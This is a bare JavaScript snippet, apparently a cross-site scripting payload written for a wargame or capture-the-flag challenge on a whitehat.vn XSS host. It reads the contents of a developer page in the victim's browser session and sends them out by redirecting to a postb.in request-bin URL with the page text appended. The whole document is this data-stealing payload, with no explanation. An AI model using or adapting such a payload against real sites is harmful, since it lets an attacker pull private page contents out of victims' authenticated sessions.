var a = new XMLHttpRequest();
a.open('GET', 'http://xss.wargame.whitehat.vn/dev.php', false);
a.send(null);
b = a.responseText;
location.href = 'https://postb.in/1585337011882-6569399423897' + escape(b);
